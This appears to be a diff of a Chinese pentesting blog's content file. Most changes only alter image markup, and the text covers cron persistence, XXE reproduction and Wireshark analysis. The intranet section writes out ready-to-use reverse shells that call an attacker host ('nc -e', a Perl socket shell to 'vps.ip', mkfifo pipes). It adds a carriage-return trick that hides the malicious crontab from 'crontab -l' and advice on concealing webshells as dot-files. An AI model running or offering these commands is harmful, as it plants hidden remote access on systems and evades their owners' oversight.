+</code></pre><p>在ubuntu中 踩了个大坑，这条命令在centos中可以执行，但是在ubuntu中不行。<br>检查日志 “/var/log/syslog” 发现计划任务执行了，但是结果没建立连接<br><img src="/2019/07/11/内网渗透/计划任务/15625034967756.jpg" alt="-w888"><br><img src="/2019/07/11/内网渗透/计划任务/15625035284231.jpg" alt="-w887"></p>
 <p>修改下软连接</p>
 <pre><code>ln -sf bash /bin/sh
-</code></pre><p><a href="/2019/07/11/内网渗透/计划任务/15625045861245.jpg" data-fancybox="group" data-caption="-w533" class="fancybox"><img src="/2019/07/11/内网渗透/计划任务/15625045861245.jpg" alt="-w533" title="-w533"></a></p>
-<p><a href="/2019/07/11/内网渗透/计划任务/15625054790101.jpg" data-fancybox="group" data-caption="-w530" class="fancybox"><img src="/2019/07/11/内网渗透/计划任务/15625054790101.jpg" alt="-w530" title="-w530"></a><br><a href="/2019/07/11/内网渗透/计划任务/15625062607262.jpg" data-fancybox="group" data-caption="-w1300" class="fancybox"><img src="/2019/07/11/内网渗透/计划任务/15625062607262.jpg" alt="-w1300" title="-w1300"></a></p>
-<p>推测是原ubuntu 版本的bin/sh 软连接 连接到dash<br>修改后的软连接：<br><a href="/2019/07/11/内网渗透/计划任务/15625069478372.jpg" data-fancybox="group" data-caption="-w653" class="fancybox"><img src="/2019/07/11/内网渗透/计划任务/15625069478372.jpg" alt="-w653" title="-w653"></a><br>这里/bin/sh软连接是sh -&gt; dash 然后rbash -&gt; bash<br>关键问题是 bash和dash的区别</p>
+</code></pre><p><img src="/2019/07/11/内网渗透/计划任务/15625045861245.jpg" alt="-w533"></p>
+<p><img src="/2019/07/11/内网渗透/计划任务/15625054790101.jpg" alt="-w530"><br><img src="/2019/07/11/内网渗透/计划任务/15625062607262.jpg" alt="-w1300"></p>
+<p>推测是原ubuntu 版本的bin/sh 软连接 连接到dash<br>修改后的软连接：<br><img src="/2019/07/11/内网渗透/计划任务/15625069478372.jpg" alt="-w653"><br>这里/bin/sh软连接是sh -&gt; dash 然后rbash -&gt; bash<br>关键问题是 bash和dash的区别</p>
 <pre><code>从Ubuntu 6.10开始，默认使用dash(theDebian Almquist Shell)而不是bash(the GNUBourne-Again Shell). 但Login Shell还是bash. 原因是dash更快、更高效，而且它符合POSIX规范。Ubuntu在启动的时候会运行很多shell脚本，使用dash可以加快启动速度
 </code></pre><h4 id="bash和dash在-bin-sh-使用中的区别-待续"><a href="#bash和dash在-bin-sh-使用中的区别-待续" class="headerlink" title="bash和dash在/bin/sh  使用中的区别-待续"></a>bash和dash在/bin/sh  使用中的区别-待续</h4><p>将该ubuntu中的/bin/sh 软连接改回到dash，查看该问题报错</p>
 <h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><p>在centos下可以使用</p>
 <pre><code>*/1 * * * * nc -e /bin/sh ip port
 </code></pre><p>别忘了重启</p>
 <pre><code>service crond restart
-</code></pre><p><a href="/2019/07/11/内网渗透/计划任务/15625077559555.jpg" data-fancybox="group" data-caption="-w892" class="fancybox"><img src="/2019/07/11/内网渗透/计划任务/15625077559555.jpg" alt="-w892" title="-w892"></a></p>
+</code></pre><p><img src="/2019/07/11/内网渗透/计划任务/15625077559555.jpg" alt="-w892"></p>
 <pre><code>*/1 * * * * perl -e &#39;use Socket;$i=&quot;vps.ip&quot;;$p=8989;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
 </code></pre><h1 id="隐藏计划任务"><a href="#隐藏计划任务" class="headerlink" title="隐藏计划任务"></a>隐藏计划任务</h1><p>在使用计划任务入侵的时候，可以简单的隐藏下计划任务，以便于不那么容易被发现</p>
 <pre><code>(crontab -l;printf &quot;*/1 * * * *  /usr/bin/nc ip 8550 -e /bin/sh;\rno crontab for `whoami`%100c\n&quot;)|crontab -
 </code></pre><p>这个时候直接用crontab -l 输出的时候是直接显示no crontab for 当前用户。</p>
-<p>注意这里有一个坑点，osx系统中的nc 没有-e 参数（在Linux的大部分发行版中都默认编译了nc，但也许是出于安全考虑，发行版中默认编译的nc往往没有-e选项(没有define一个<br>GAPING_SECURITY_HOLE常量)，也就是说我们不能通过-e选项绑定目标的shell，使得我们在利用上受到限制，但这种情况下是不是就），这里可以看看mail文件”/var/mail/name”里面的报错<br><a href="/2019/07/11/内网渗透/计划任务/15626424045783.jpg" data-fancybox="group" data-caption="-w657" class="fancybox"><img src="/2019/07/11/内网渗透/计划任务/15626424045783.jpg" alt="-w657" title="-w657"></a></p>
-<h2 id="nc-缺少-e-参数的解决方式"><a href="#nc-缺少-e-参数的解决方式" class="headerlink" title="nc 缺少 -e 参数的解决方式"></a>nc 缺少 -e 参数的解决方式</h2><h3 id="dev-tcp"><a href="#dev-tcp" class="headerlink" title="dev/tcp"></a>dev/tcp</h3><p>在缺少 -e得时候，可以使用bash dev/tcp/ip/port（在有/dev/tcp的bash的前提下）<br><a href="/2019/07/11/内网渗透/计划任务/15631095532134.jpg" data-fancybox="group" data-caption="-w563" class="fancybox"><img src="/2019/07/11/内网渗透/计划任务/15631095532134.jpg" alt="-w563" title="-w563"></a></p>
-<p><a href="/2019/07/11/内网渗透/计划任务/15631095859841.jpg" data-fancybox="group" data-caption="-w1112" class="fancybox"><img src="/2019/07/11/内网渗透/计划任务/15631095859841.jpg" alt="-w1112" title="-w1112"></a></p>
+<p>注意这里有一个坑点，osx系统中的nc 没有-e 参数（在Linux的大部分发行版中都默认编译了nc，但也许是出于安全考虑，发行版中默认编译的nc往往没有-e选项(没有define一个<br>GAPING_SECURITY_HOLE常量)，也就是说我们不能通过-e选项绑定目标的shell，使得我们在利用上受到限制，但这种情况下是不是就），这里可以看看mail文件”/var/mail/name”里面的报错<br><img src="/2019/07/11/内网渗透/计划任务/15626424045783.jpg" alt="-w657"></p>
+<h2 id="nc-缺少-e-参数的解决方式"><a href="#nc-缺少-e-参数的解决方式" class="headerlink" title="nc 缺少 -e 参数的解决方式"></a>nc 缺少 -e 参数的解决方式</h2><h3 id="dev-tcp"><a href="#dev-tcp" class="headerlink" title="dev/tcp"></a>dev/tcp</h3><p>在缺少 -e得时候，可以使用bash dev/tcp/ip/port（在有/dev/tcp的bash的前提下）<br><img src="/2019/07/11/内网渗透/计划任务/15631095532134.jpg" alt="-w563"></p>
+<p><img src="/2019/07/11/内网渗透/计划任务/15631095859841.jpg" alt="-w1112"></p>
 <h3 id="mknod-FIFO"><a href="#mknod-FIFO" class="headerlink" title="mknod FIFO"></a>mknod FIFO</h3><pre><code>mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f
-</code></pre><p><a href="/2019/07/11/内网渗透/计划任务/15631099611608.jpg" data-fancybox="group" data-caption="-w1122" class="fancybox"><img src="/2019/07/11/内网渗透/计划任务/15631099611608.jpg" alt="-w1122" title="-w1122"></a><br>mkfifo</p>
+</code></pre><p><img src="/2019/07/11/内网渗透/计划任务/15631099611608.jpg" alt="-w1122"><br>mkfifo</p>
 <p>或者</p>
 <pre><code>mknod /tmp/backpipe p ;/bin/sh 0&lt; /tmp/backpipe | nc ip 443 1&gt; /tmp/backpipe
-</code></pre><p><a href="/2019/07/11/内网渗透/计划任务/15631105445990.jpg" data-fancybox="group" data-caption="-w1136" class="fancybox"><img src="/2019/07/11/内网渗透/计划任务/15631105445990.jpg" alt="-w1136" title="-w1136"></a></p>
+</code></pre><p><img src="/2019/07/11/内网渗透/计划任务/15631105445990.jpg" alt="-w1136"></p>
 <h2 id="隐藏文件-文件夹"><a href="#隐藏文件-文件夹" class="headerlink" title="隐藏文件/文件夹"></a>隐藏文件/文件夹</h2><p>Linux/Unix 藏文件和文件夹<br>Linux/Unix 下想藏 Webshell 或者后门什么的，可以利用一下隐藏文件夹和文件。</p>
 <p>方法一<br>比如创建一个名字开头带 . 的 Webshell 或者文件夹，默认情况下是不会显示出来的，浏览器访问的时候加点访问就行。（查看方法：ls -a）</p>
 <pre><code>touch .webshell.php 创建名字为 .webshell.php 的文件
@@ -1472,14 +1476,14 @@ mkdir … 创建名字为 … 的文件夹
         &lt;/dependency&gt;
 </code></pre><p>【3】配置好环境变量后，进入对应的web/projection 打包运行</p>
 <pre><code>mvn package
-</code></pre><p><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613639506348.jpg" data-fancybox="group" data-caption="-w1133" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613639506348.jpg" alt="-w1133" title="-w1133"></a></p>
+</code></pre><p><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613639506348.jpg" alt="-w1133"></p>
 <h4 id="部署运行"><a href="#部署运行" class="headerlink" title="部署运行"></a>部署运行</h4><p>进入对应目录搭建运行</p>
 <pre><code>java -jar spring-data-web-projection-2.0.0.BUILD-SNAPSHOT.jar
-</code></pre><p><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613640157733.jpg" data-fancybox="group" data-caption="-w754" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613640157733.jpg" alt="-w754" title="-w754"></a></p>
-<h4 id="poc复现"><a href="#poc复现" class="headerlink" title="poc复现"></a>poc复现</h4><p>构造post请求<br><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613640647871.jpg" data-fancybox="group" data-caption="-w1318" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613640647871.jpg" alt="-w1318" title="-w1318"></a><br>比较奇怪的一点是，正常的xxe请求 任意文件读取 都应该是 file:///<br>这里直接执行也行<br><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613641950150.jpg" data-fancybox="group" data-caption="-w1094" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613641950150.jpg" alt="-w1094" title="-w1094"></a></p>
+</code></pre><p><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613640157733.jpg" alt="-w754"></p>
+<h4 id="poc复现"><a href="#poc复现" class="headerlink" title="poc复现"></a>poc复现</h4><p>构造post请求<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613640647871.jpg" alt="-w1318"><br>比较奇怪的一点是，正常的xxe请求 任意文件读取 都应该是 file:///<br>这里直接执行也行<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613641950150.jpg" alt="-w1094"></p>
 <pre><code>
 注意  这里的content-type 类型，得支持，改为 application/xml
-</code></pre><p>xxe支持的content-type fuzz一下<br>在位置中application/xhtml+xml 与 application/xml 的效果是一样的<br><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613841433359.jpg" data-fancybox="group" data-caption="-w1016" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613841433359.jpg" alt="-w1016" title="-w1016"></a></p>
+</code></pre><p>xxe支持的content-type fuzz一下<br>在位置中application/xhtml+xml 与 application/xml 的效果是一样的<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613841433359.jpg" alt="-w1016"></p>
 <pre><code>注
 Accept代表发送端（客户端）希望接受的数据类型。 
 比如：Accept：text/xml; 
@@ -1488,19 +1492,19 @@ Accept代表发送端（客户端）希望接受的数据类型。
 Content-Type代表发送端（客户端|服务器）发送的实体数据的数据类型。 
 比如：Content-Type：text/html; 
 代表发送端发送的数据格式是html。
-</code></pre><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>从该位置可以知道漏洞位置是在 firstname和lastname的接收处理，所以跟踪下idea下的该函数。<br><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613896457891.jpg" data-fancybox="group" data-caption="-w1283" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613896457891.jpg" alt="-w1283" title="-w1283"></a><br>该maven项目demo中就application和userController 两个函数，从主函数跟踪。<br><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613906870820.jpg" data-fancybox="group" data-caption="-w911" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613906870820.jpg" alt="-w911" title="-w911"></a><br>可以看到post请求中的user.getFirstname(),user.getLastname() 方法<br><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613907763911.jpg" data-fancybox="group" data-caption="-w404" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613907763911.jpg" alt="-w404" title="-w404"></a><br><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613909426094.jpg" data-fancybox="group" data-caption="-w805" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613909426094.jpg" alt="-w805" title="-w805"></a><br><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613909700427.jpg" data-fancybox="group" data-caption="-w881" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613909700427.jpg" alt="-w881" title="-w881"></a></p>
-<p>跟踪下 会发现，在调用responseEntity的时候就已经读取文件了<br><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15614750470756.jpg" data-fancybox="group" data-caption="-w932" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15614750470756.jpg" alt="-w932" title="-w932"></a><br><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15614751204095.jpg" data-fancybox="group" data-caption="-w943" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15614751204095.jpg" alt="-w943" title="-w943"></a></p>
-<p>参考网上的分析，漏洞的处理函数位是在org.xmlbeam.ProjectionInvocationHandler:invokeReadProjection()处理<br><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15614773758537.jpg" data-fancybox="group" data-caption="-w913" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15614773758537.jpg" alt="-w913" title="-w913"></a></p>
+</code></pre><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>从该位置可以知道漏洞位置是在 firstname和lastname的接收处理，所以跟踪下idea下的该函数。<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613896457891.jpg" alt="-w1283"><br>该maven项目demo中就application和userController 两个函数，从主函数跟踪。<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613906870820.jpg" alt="-w911"><br>可以看到post请求中的user.getFirstname(),user.getLastname() 方法<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613907763911.jpg" alt="-w404"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613909426094.jpg" alt="-w805"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613909700427.jpg" alt="-w881"></p>
+<p>跟踪下 会发现，在调用responseEntity的时候就已经读取文件了<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15614750470756.jpg" alt="-w932"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15614751204095.jpg" alt="-w943"></p>
+<p>参考网上的分析，漏洞的处理函数位是在org.xmlbeam.ProjectionInvocationHandler:invokeReadProjection()处理<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15614773758537.jpg" alt="-w913"></p>
 <p>顺带在这里看下相对路径处理成功的原因</p>
 <h2 id="待补充细分"><a href="#待补充细分" class="headerlink" title="待补充细分"></a>待补充细分</h2><p>  在提交http/post请求后，跟踪下</p>
 <pre class=" language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> Object readWithMessageConverters
 </code></pre>
-<p>在对该post参数进行处理时，这里还没进行文件读取转换<br><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618975324384.jpg" data-fancybox="group" data-caption="-w900" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618975324384.jpg" alt="-w900" title="-w900"></a><br><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618981734937.jpg" data-fancybox="group" data-caption="-w1184" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618981734937.jpg" alt="-w1184" title="-w1184"></a><br><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618983029402.jpg" data-fancybox="group" data-caption="-w1144" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618983029402.jpg" alt="-w1144" title="-w1144"></a><br><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618991907073.jpg" data-fancybox="group" data-caption="-w1425" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618991907073.jpg" alt="-w1425" title="-w1425"></a><br><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618992335070.jpg" data-fancybox="group" data-caption="-w704" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618992335070.jpg" alt="-w704" title="-w704"></a></p>
-<p>漏洞原因是在于XMLBeam漏洞版本中没有限制外部实体<br><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619003084333.jpg" data-fancybox="group" data-caption="-w701" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619003084333.jpg" alt="-w701" title="-w701"></a></p>
-<p><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619002278361.jpg" data-fancybox="group" data-caption="-w771" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619002278361.jpg" alt="-w771" title="-w771"></a></p>
-<p><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619001968741.jpg" data-fancybox="group" data-caption="-w810" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619001968741.jpg" alt="-w810" title="-w810"></a></p>
-<p><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619001679940.jpg" data-fancybox="group" data-caption="-w805" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619001679940.jpg" alt="-w805" title="-w805"></a></p>
-<p><a href="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619001256468.jpg" data-fancybox="group" data-caption="-w915" class="fancybox"><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619001256468.jpg" alt="-w915" title="-w915"></a></p>
+<p>在对该post参数进行处理时，这里还没进行文件读取转换<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618975324384.jpg" alt="-w900"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618981734937.jpg" alt="-w1184"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618983029402.jpg" alt="-w1144"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618991907073.jpg" alt="-w1425"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618992335070.jpg" alt="-w704"></p>
+<p>漏洞原因是在于XMLBeam漏洞版本中没有限制外部实体<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619003084333.jpg" alt="-w701"></p>
+<p><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619002278361.jpg" alt="-w771"></p>
+<p><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619001968741.jpg" alt="-w810"></p>
+<p><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619001679940.jpg" alt="-w805"></p>
+<p><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619001256468.jpg" alt="-w915"></p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.spoock.com/2018/10/23/java-xxe/" target="_blank" rel="noopener">JAVA常见的XXE漏洞写法和防御</a><br><a href="https://blog.spoock.com/2018/05/16/cve-2018-1259/" target="_blank" rel="noopener">spring-data-XMLBean XXE复现分析</a><br><a href="https://xz.aliyun.com/t/2341" target="_blank" rel="noopener">XXE with Spring Data’s XMLBeam 分析</a><br><a href="https://www.cnblogs.com/Qian123/p/5256084.html" target="_blank" rel="noopener">框架基础——全面解析Java注解</a></p>
 ]]></content>
       
@@ -1548,9 +1552,9 @@ TCP数据包中的IP数据包：tcp.len&gt;=20
 请求方法为POST：http.request.method==“POST”
 指定URI：http.request.uri==“/img/logo-edu.gif”
 请求或相应中包含特定内容：http contains “FLAG”
-</code></pre><h2 id="实际分析"><a href="#实际分析" class="headerlink" title="实际分析"></a>实际分析</h2><h3 id="病毒端口分析"><a href="#病毒端口分析" class="headerlink" title="病毒端口分析"></a>病毒端口分析</h3><p>因为在服务器上发现的病毒是在tina文件夹下，tina程序执行 tina_daemon.exe,监听端口是2525，在发现是无链接，所以在拿到数据包的时候首先过滤2525 端口<br><a href="/2019/06/10/工具使用/wireshark使用记录/15604724400866.jpg" data-fancybox="group" data-caption="-w973" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15604724400866.jpg" alt="-w973" title="-w973"></a><br>经检测 无数据<br><a href="/2019/06/10/工具使用/wireshark使用记录/15604725384626.jpg" data-fancybox="group" data-caption="-w413" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15604725384626.jpg" alt="-w413" title="-w413"></a></p>
-<h3 id="ip分析"><a href="#ip分析" class="headerlink" title="ip分析"></a>ip分析</h3><p>提取下数据包中包含的ip地址进行分析下<br><a href="/2019/06/10/工具使用/wireshark使用记录/15604776123512.jpg" data-fancybox="group" data-caption="-w1417" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15604776123512.jpg" alt="-w1417" title="-w1417"></a></p>
-<p><a href="/2019/06/10/工具使用/wireshark使用记录/15604847479194.jpg" data-fancybox="group" data-caption="-w698" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15604847479194.jpg" alt="-w698" title="-w698"></a></p>
+</code></pre><h2 id="实际分析"><a href="#实际分析" class="headerlink" title="实际分析"></a>实际分析</h2><h3 id="病毒端口分析"><a href="#病毒端口分析" class="headerlink" title="病毒端口分析"></a>病毒端口分析</h3><p>因为在服务器上发现的病毒是在tina文件夹下，tina程序执行 tina_daemon.exe,监听端口是2525，在发现是无链接，所以在拿到数据包的时候首先过滤2525 端口<br><img src="/2019/06/10/工具使用/wireshark使用记录/15604724400866.jpg" alt="-w973"><br>经检测 无数据<br><img src="/2019/06/10/工具使用/wireshark使用记录/15604725384626.jpg" alt="-w413"></p>
+<h3 id="ip分析"><a href="#ip分析" class="headerlink" title="ip分析"></a>ip分析</h3><p>提取下数据包中包含的ip地址进行分析下<br><img src="/2019/06/10/工具使用/wireshark使用记录/15604776123512.jpg" alt="-w1417"></p>
+<p><img src="/2019/06/10/工具使用/wireshark使用记录/15604847479194.jpg" alt="-w698"></p>
 <p>外网ip</p>
 <pre><code>42.81.104.4 天津电信 无信息 美图
 49.7.50.36 北京市北京市 电信 无信息 360
@@ -1560,9 +1564,9 @@ TCP数据包中的IP数据包：tcp.len&gt;=20
 221.230.147.106 江苏泰州 电信 微软
 </code></pre><p>内网ip：</p>
 <h4 id="探测下进行ping-探测的设备"><a href="#探测下进行ping-探测的设备" class="headerlink" title="探测下进行ping 探测的设备"></a>探测下进行ping 探测的设备</h4><ul>
-<li><p>ping 探测失败的信息<br><a href="/2019/06/10/工具使用/wireshark使用记录/15604747032178.jpg" data-fancybox="group" data-caption="-w923" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15604747032178.jpg" alt="-w923" title="-w923"></a><br>89.0.0.241 是DNS服务器</p>
+<li><p>ping 探测失败的信息<br><img src="/2019/06/10/工具使用/wireshark使用记录/15604747032178.jpg" alt="-w923"><br>89.0.0.241 是DNS服务器</p>
 </li>
-<li><p>DNS协议<br><a href="/2019/06/10/工具使用/wireshark使用记录/15604751748952.jpg" data-fancybox="group" data-caption="-w1176" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15604751748952.jpg" alt="-w1176" title="-w1176"></a><br>解析到360天擎 服务端</p>
+<li><p>DNS协议<br><img src="/2019/06/10/工具使用/wireshark使用记录/15604751748952.jpg" alt="-w1176"><br>解析到360天擎 服务端</p>
 </li>
 </ul>
 <p>除此之外还解析请求了两个 内网，但未解析成功<br>分别是<br>10.185.49.42<br>172.17.136.21</p>
@@ -1570,8 +1574,8 @@ TCP数据包中的IP数据包：tcp.len&gt;=20
 <li>分析所有连接到ip<br>结合威胁情报 检测所有的ip，未发现敏感连接</li>
 </ul>
 <h3 id="病毒分析"><a href="#病毒分析" class="headerlink" title="病毒分析"></a>病毒分析</h3><p>回过头来看下木马程序</p>
-<p><a href="/2019/06/10/工具使用/wireshark使用记录/15604729787421.jpg" data-fancybox="group" data-caption="-w693" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15604729787421.jpg" alt="-w693" title="-w693"></a></p>
-<p><a href="/2019/06/10/工具使用/wireshark使用记录/15604730171667.jpg" data-fancybox="group" data-caption="-w1138" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15604730171667.jpg" alt="-w1138" title="-w1138"></a></p>
+<p><img src="/2019/06/10/工具使用/wireshark使用记录/15604729787421.jpg" alt="-w693"></p>
+<p><img src="/2019/06/10/工具使用/wireshark使用记录/15604730171667.jpg" alt="-w1138"></p>
 <p>根据这个信息google了一下<br><a href="https://talhatariq.wordpress.com/2006/04/14/the-open-source-psexec/" target="_blank" rel="noopener">RemCom</a></p>
 <h4 id="木马工具行为分析"><a href="#木马工具行为分析" class="headerlink" title="木马工具行为分析"></a>木马工具行为分析</h4><p>该木马主要是一个开源的psexec 远程管理工具<br>工具的说明如下：</p>
 <pre><code>RemCom是开源的:。
@@ -1584,27 +1588,27 @@ RemCom在远程计算机上创建一个小的（&lt;1 KB）服务（它在运行
 应用程序在成功断开连接时删除了连接和服务的痕迹（整洁吧？
 </code></pre><p>它允许在远程Windows系统上执行进程，复制文件，处理输出并将其流回。允许直接使用完整的交互式控制台执行远程shell命令</p>
 <p>分析完发现这个是一个正常的数据包，笔记写得没什么意思，又不想去逆向分析,就找找其他wireshark分析的案列看看</p>
-<h2 id="数据分析案例"><a href="#数据分析案例" class="headerlink" title="数据分析案例"></a>数据分析案例</h2><p>直接搜索字符串，然后跟踪数据流如下<br><a href="/2019/06/10/工具使用/wireshark使用记录/15604975574265.jpg" data-fancybox="group" data-caption="-w584" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15604975574265.jpg" alt="-w584" title="-w584"></a></p>
+<h2 id="数据分析案例"><a href="#数据分析案例" class="headerlink" title="数据分析案例"></a>数据分析案例</h2><p>直接搜索字符串，然后跟踪数据流如下<br><img src="/2019/06/10/工具使用/wireshark使用记录/15604975574265.jpg" alt="-w584"></p>
 <p>想走捷径，在这个基础上尝试利用ftp的被动模式 PSAV 直接连接，结果却发现密码不正确，认证失败，这就很尴尬了，只有继续老老实实的分析数据包。<br>查看数据包，在数据包中直接导出文件：<br>我这里直接使用的foremost导出</p>
 <pre><code>foremost -v -i name.pcap
-</code></pre><p><a href="/2019/06/10/工具使用/wireshark使用记录/15606752899123.jpg" data-fancybox="group" data-caption="-w617" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15606752899123.jpg" alt="-w617" title="-w617"></a>导出了一个压缩包和key.log；<br><a href="/2019/06/10/工具使用/wireshark使用记录/15606753433909.jpg" data-fancybox="group" data-caption="-w733" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15606753433909.jpg" alt="-w733" title="-w733"></a></p>
-<p>看一下key.log<br><a href="/2019/06/10/工具使用/wireshark使用记录/15606824487576.jpg" data-fancybox="group" data-caption="-w644" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15606824487576.jpg" alt="-w644" title="-w644"></a><br>记录的是Session Key TLS密钥（借用firfox或chrome配置记录，即可记录该信息）</p>
-<p><a href="/2019/06/10/工具使用/wireshark使用记录/15606845604745.jpg" data-fancybox="group" data-caption="-w914" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15606845604745.jpg" alt="-w914" title="-w914"></a><br>导出来 看下频谱图 跳下采样率，解压</p>
+</code></pre><p><img src="/2019/06/10/工具使用/wireshark使用记录/15606752899123.jpg" alt="-w617">导出了一个压缩包和key.log；<br><img src="/2019/06/10/工具使用/wireshark使用记录/15606753433909.jpg" alt="-w733"></p>
+<p>看一下key.log<br><img src="/2019/06/10/工具使用/wireshark使用记录/15606824487576.jpg" alt="-w644"><br>记录的是Session Key TLS密钥（借用firfox或chrome配置记录，即可记录该信息）</p>
+<p><img src="/2019/06/10/工具使用/wireshark使用记录/15606845604745.jpg" alt="-w914"><br>导出来 看下频谱图 跳下采样率，解压</p>
 <h2 id="wireshark-tcp三次握手"><a href="#wireshark-tcp三次握手" class="headerlink" title="wireshark tcp三次握手"></a>wireshark tcp三次握手</h2><p>众所周知，tcp三次握手传输过程</p>
 <pre><code>第一次   client --------&gt; server     syn
-</code></pre><p>客户端发送syn包（syn=j）到服务器，并进入到syn_sent状态，等待服务端确认<br><a href="/2019/06/10/工具使用/wireshark使用记录/15606653847491.jpg" data-fancybox="group" data-caption="-w1406" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15606653847491.jpg" alt="-w1406" title="-w1406"></a><br><a href="/2019/06/10/工具使用/wireshark使用记录/15606654495869.jpg" data-fancybox="group" data-caption="-w1334" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15606654495869.jpg" alt="-w1334" title="-w1334"></a></p>
